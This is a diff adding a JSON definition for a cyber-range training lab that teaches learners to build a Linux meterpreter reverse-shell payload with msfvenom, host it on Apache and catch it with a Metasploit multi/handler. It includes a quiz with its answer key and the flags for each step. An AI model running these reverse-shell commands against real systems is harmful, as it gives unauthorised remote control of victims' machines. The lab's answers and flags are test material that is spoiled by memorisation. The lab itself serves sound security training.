@@ -1,0 +1,256 @@
+{
+  "title" : "Uploaded LAB 2 - Creating Infectious Media",
+  "description" : "Using msfvenom to create a reverse shell on Linux system.",
+  "prerequisites" : [ "Prepare msfvenom lession.", "Prepare reverse shell lession." ],
+  "outcomes" : [ "Know how to use msfvenom.", "Know how to create a reverse shell.", "Get more knowledge and careful about what hacker can do to hijack your computer." ],
+  "state" : "UNRELEASED",
+  "show_stepper_bar" : true,
+  "levels" : [ {
+    "title" : "Introduction",
+    "level_type" : "INFO_LEVEL",
+    "order" : 0,
+    "estimated_duration" : 0,
+    "minimal_possible_solve_time" : null,
+    "content" : "Welcome to Lab 2 of our HOD Labs training series! In this lesson, we will delve into the fascinating world of using msfvenom to create a reverse shell on a Linux system.\n\nAs technology continues to evolve, so do the methods employed by both cybercriminals and cybersecurity professionals. Understanding how attackers exploit vulnerabilities is crucial in building robust defense mechanisms. Creating infectious media allows us to simulate real-world attack scenarios and gain valuable insights into potential vulnerabilities within our systems.\n\nThroughout this lesson, we will focus on msfvenom, a powerful tool provided by the Metasploit Framework. Msfvenom enables us to generate malicious payloads, which, when executed, can provide unauthorized access to target systems.\n\nOur specific objective will be to create a reverse shell on a Linux system. A reverse shell is a technique commonly used by attackers to gain control over a compromised machine, allowing them to execute commands and interact with the system remotely. By comprehending this attack method, we can better anticipate and defend against such threats.\n\nDuring this session, we will explore the fundamentals of using msfvenom to create a reverse shell payload. We will discuss various parameters, options, and techniques involved in crafting an effective payload. Additionally, we will cover essential concepts, such as listener setup and payload execution, to complete the attack cycle successfully.\n\nWhile we engage in the process of crafting infectious media, it is essential to remember that the knowledge gained should be utilized responsibly and solely for defensive purposes.\n\nGet ready to explore the intriguing world of Creating Infectious Media using msfvenom to create a reverse shell on a Linux system. Let's begin our journey towards a deeper understanding of offensive techniques, empowering us to fortify our defenses and safeguard our digital assets."
+  }, {
+    "title" : "Quick Knowledge Test",
+    "level_type" : "ASSESSMENT_LEVEL",
+    "order" : 1,
+    "estimated_duration" : 8,
+    "minimal_possible_solve_time" : null,
+    "questions" : [ {
+      "question_type" : "MCQ",
+      "text" : "Which operating system is the focus of this lesson for creating a reverse shell?",
+      "points" : 5,
+      "penalty" : 5,
+      "order" : 0,
+      "answer_required" : true,
+      "choices" : [ {
+        "text" : "Windows",
+        "correct" : false,
+        "order" : 0
+      }, {
+        "text" : "Linux",
+        "correct" : true,
+        "order" : 1
+      }, {
+        "text" : "macOS",
+        "correct" : false,
+        "order" : 2
+      }, {
+        "text" : "Android",
+        "correct" : false,
+        "order" : 3
+      } ]
+    }, {
+      "question_type" : "MCQ",
+      "text" : "Which framework provides the msfvenom tool?",
+      "points" : 5,
+      "penalty" : 5,
+      "order" : 1,
+      "answer_required" : true,
+      "choices" : [ {
+        "text" : "Nmap",
+        "correct" : false,
+        "order" : 0
+      }, {
+        "text" : "Wireshark",
+        "correct" : false,
+        "order" : 1
+      }, {
+        "text" : "Metasploit",
+        "correct" : true,
+        "order" : 2
+      }, {
+        "text" : "Burp Suite",
+        "correct" : false,
+        "order" : 3
+      } ]
+    }, {
+      "question_type" : "MCQ",
+      "text" : "What is a reverse shell?",
+      "points" : 5,
+      "penalty" : 5,
+      "order" : 2,
+      "answer_required" : true,
+      "choices" : [ {
+        "text" : "A shell script that executes commands on a target system",
+        "correct" : false,
+        "order" : 0
+      }, {
+        "text" : "A technique to remotely control a compromised machine",
+        "correct" : true,
+        "order" : 1
+      }, {
+        "text" : "A method to defend against malware infections",
+        "correct" : false,
+        "order" : 2
+      }, {
+        "text" : "A tool for generating malicious payloads",
+        "correct" : false,
+        "order" : 3
+      } ]
+    }, {
+      "question_type" : "MCQ",
+      "text" : "What is the main purpose of using msfvenom to create a reverse shell?",
+      "points" : 5,
+      "penalty" : 5,
+      "order" : 3,
+      "answer_required" : true,
+      "choices" : [ {
+        "text" : "To simulate real-world attack scenarios",
+        "correct" : false,
+        "order" : 0
+      }, {
+        "text" : "To gain unauthorized access to target systems",
+        "correct" : true,
+        "order" : 1
+      }, {
+        "text" : "To defend against potential vulnerabilities",
+        "correct" : false,
+        "order" : 2
+      }, {
+        "text" : "To enhance system security",
+        "correct" : false,
+        "order" : 3
+      } ]
+    }, {
+      "question_type" : "MCQ",
+      "text" : "What is the purpose of listener setup in the reverse shell attack cycle?",
+      "points" : 5,
+      "penalty" : 5,
+      "order" : 4,
+      "answer_required" : true,
+      "choices" : [ {
+        "text" : "To generate the malicious payload",
+        "correct" : false,
+        "order" : 0
+      }, {
+        "text" : "To identify potential vulnerabilities",
+        "correct" : false,
+        "order" : 1
+      }, {
+        "text" : "To analyze network traffic",
+        "correct" : false,
+        "order" : 2
+      }, {
+        "text" : "To establish a remote connection to the target system",
+        "correct" : true,
+        "order" : 3
+      } ]
+    } ],
+    "instructions" : "Answer questions and move on to next phase.",
+    "assessment_type" : "TEST"
+  }, {
+    "title" : "Get Access",
+    "level_type" : "ACCESS_LEVEL",
+    "order" : 2,
+    "estimated_duration" : 0,
+    "minimal_possible_solve_time" : null,
+    "passkey" : "start-training",
+    "cloud_content" : "For accessing KYPO virtual machines using your local command-line tool, click on `Get SSH access` button to download ZIP file and then follow the instructions in the [documentation](https://docs.crp.kypo.muni.cz/user-guide-advanced/sandboxes/sandbox-access/#user-access). When you are ready to advance to the next phase, submit the answer provided by the organizer.\nOr right-click on the selected network node (host or router) in the network topology will open the menu with the following options :\n\nOpen console: Opens the command-line interface (CLI) in Apache Guacamole application using the SSH protocol. This option is available only for routers and hosts with Linux-based operating systems.\n\nOpen console (deprecated): Opens web browser-based user interface using Spice client. This option is available for all routers and hosts, but it doesn’t support the Copy & paste feature, and the response from the machine may be slow, so it seems that the console is freezing. Therefore it was marked as deprecated and we recommend using the other options to access the sandbox node.\n\nOpen GUI: Opens graphical user interface (GUI) in Apache Guacamole application using the VNC or RDP protocol. This option can be available for all routers and hosts but depends on whether they are properly configured.\n\n# Switch to user:**`client`** and password:**`password`** to proceed the lab.",
+    "local_content" : "Before proceeding further, you need to start a sandbox on your machine. \nPlease clone [this Gitlab repository](https://<link_to_a_repo>) and follow steps in the README file.\nWhen your sandbox is ready at your host, submit the passkey from the README file."
+  }, {
+    "title" : "Generate the Reverse Shell Payload",
+    "level_type" : "TRAINING_LEVEL",
+    "order" : 3,
+    "estimated_duration" : 10,
+    "minimal_possible_solve_time" : null,
+    "answer" : "ifconfig",
+    "answer_variable_name" : null,
+    "content" : "# Execute the following command to generate the reverse shell payload using msfvenom:\n\n`sudo msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<your IP address> LPORT=<PORT> -f elf -o /var/www/html/shell-x64.elf`\n\n## Q: What the command in CLI Linux OS you use to get your IP address?",
+    "solution" : "ifconfig",
+    "solution_penalized" : true,
+    "hints" : [ ],
+    "incorrect_answer_limit" : 10,
+    "attachments" : [ ],
+    "max_score" : 15,
+    "variant_answers" : false,
+    "reference_solution" : [ ],
+    "mitre_techniques" : [ ],
+    "expected_commands" : [ ],
+    "commands_required" : false
+  }, {
+    "title" : "Start the Apache Web Server",
+    "level_type" : "TRAINING_LEVEL",
+    "order" : 4,
+    "estimated_duration" : 10,
+    "minimal_possible_solve_time" : null,
+    "answer" : "/var/www/html/",
+    "answer_variable_name" : null,
+    "content" : "# In the terminal, execute the following command to start the Apache web server:\n\n`sudo service apache2 start`\n\n## Q: Where is the directory that these content in it to the internet? This can be found in previous step. \n(Format: /dirA/dirB/dirC/)",
+    "solution" : "/var/www/html/",
+    "solution_penalized" : true,
+    "hints" : [ ],
+    "incorrect_answer_limit" : 10,
+    "attachments" : [ ],
+    "max_score" : 15,
+    "variant_answers" : false,
+    "reference_solution" : [ ],
+    "mitre_techniques" : [ ],
+    "expected_commands" : [ ],
+    "commands_required" : false
+  }, {
+    "title" : "Launch Metasploit Framework",
+    "level_type" : "TRAINING_LEVEL",
+    "order" : 5,
+    "estimated_duration" : 10,
+    "minimal_possible_solve_time" : null,
+    "answer" : "msfconsole",
+    "answer_variable_name" : null,
+    "content" : "# In this step, you have to find a command to launch the Metasploit Framework console then execute it.\n\n## Q: The command is also the answer for this step.",
+    "solution" : "msfconsole",
+    "solution_penalized" : true,
+    "hints" : [ ],
+    "incorrect_answer_limit" : 10,
+    "attachments" : [ ],
+    "max_score" : 15,
+    "variant_answers" : false,
+    "reference_solution" : [ ],
+    "mitre_techniques" : [ ],
+    "expected_commands" : [ ],
+    "commands_required" : false
+  }, {
+    "title" : "Configure Metasploit for Reverse Shell Handling",
+    "level_type" : "TRAINING_LEVEL",
+    "order" : 6,
+    "estimated_duration" : 10,
+    "minimal_possible_solve_time" : null,
+    "answer" : "tcp",
+    "answer_variable_name" : null,
+    "content" : "# Within the Metasploit console, execute the following commands:\n\n`use exploit/multi/handler`\n\n`set PAYLOAD linux/x64/meterpreter_reverse_tcp`\n\n`set LPORT <PORT that you use in the create reverse shell step>`\n\n`set LHOST <your IP address>`\n\n## Q: What protocol you use for configure the reverse shell? (example for protocol format: http, udp, ftp, ...)",
+    "solution" : "tcp",
+    "solution_penalized" : true,
+    "hints" : [ ],
+    "incorrect_answer_limit" : 10,
+    "attachments" : [ ],
+    "max_score" : 15,
+    "variant_answers" : false,
+    "reference_solution" : [ ],
+    "mitre_techniques" : [ ],
+    "expected_commands" : [ ],
+    "commands_required" : false
+  }, {
+    "title" : "Exploit with Reverse Shell",
+    "level_type" : "TRAINING_LEVEL",
+    "order" : 7,
+    "estimated_duration" : 10,
+    "minimal_possible_solve_time" : null,
+    "answer" : "Top_Secret_Flag",
+    "answer_variable_name" : null,
+    "content" : "# Execute the following command to initiate the reverse shell exploit:\n\n`exploit`\n\n# Then wait a few seconds for the server get hijack by your reverse shell code.\n\n## Q: After you get into the victim (server) machine, you must find a flag to submit it. It lays around somewhere at home folder.",
+    "solution" : "Top_Secret_Flag",
+    "solution_penalized" : true,
+    "hints" : [ ],
+    "incorrect_answer_limit" : 10,
+    "attachments" : [ ],
+    "max_score" : 15,
+    "variant_answers" : false,
+    "reference_solution" : [ ],
+    "mitre_techniques" : [ ],
+    "expected_commands" : [ ],
+    "commands_required" : false
+  } ],
+  "estimated_duration" : 58,
+  "variant_sandboxes" : false
+}
